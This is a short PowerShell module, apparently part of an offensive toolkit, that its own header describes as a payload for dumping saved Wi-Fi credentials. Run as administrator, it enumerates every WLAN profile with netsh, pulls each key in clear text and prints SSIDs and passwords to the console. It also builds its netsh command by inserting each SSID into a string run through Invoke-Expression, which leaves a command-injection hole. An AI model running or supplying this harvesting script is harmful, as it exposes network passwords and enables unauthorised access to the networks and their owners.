<#
.SYNOPSIS
  Dumps WLAN ifno (credentials etc)
.DESCRIPTION
  This payload dumps keys in clear text for saved WLAN profiles.
  The payload must be run from as administrator to get the keys.
.EXAMPLE
  PS > InvokeWPS-EnumWLANCredentials.psm1
  
#>

Function Global:InvokeWPS-EnumWLANCredentials()
{
  # Get all Wirless profiles - and format appropriately. 
  $WLAN_PROFILES      = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
  $WLAN_GREP_DATA     = $WLAN_PROFILES  | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}

  foreach($SSID in $WLAN_GREP_DATA)
  {

      # Information extraction command
      $Exec = "netsh wlan show profiles name=""$SSID"" key=clear"
      $Thisprofile = Invoke-Expression $Exec 


      Write-Host " - "-ForegroundColor DarkGray

      $WirelessDump = $Thisprofile | select-string "SSID name", "Key Content", "Number of SSIDs" 

      Write-Host $WirelessDump[0] -ForegroundColor DarkMagenta
      Write-Host $WirelessDump[1] -ForegroundColor DarkMagenta
      Write-Host $WirelessDump[2] -ForegroundColor DarkMagenta

      Write-Host " - " -ForegroundColor DarkGray
  }
}
